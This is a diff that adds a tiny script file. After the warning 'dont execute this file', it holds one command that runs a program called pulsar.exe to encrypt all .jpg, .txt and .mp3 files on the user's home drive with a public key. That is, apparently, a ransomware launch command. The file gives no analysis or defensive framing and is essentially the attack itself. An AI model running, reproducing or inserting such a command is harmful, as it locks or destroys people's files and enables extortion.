@@ -1,0 +1,6 @@
+dont execute this file!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+pulsar.exe -opt encrypt -area %HOMEDRIVE% -keypath public.key .jpg .txt .mp3
+
+
+
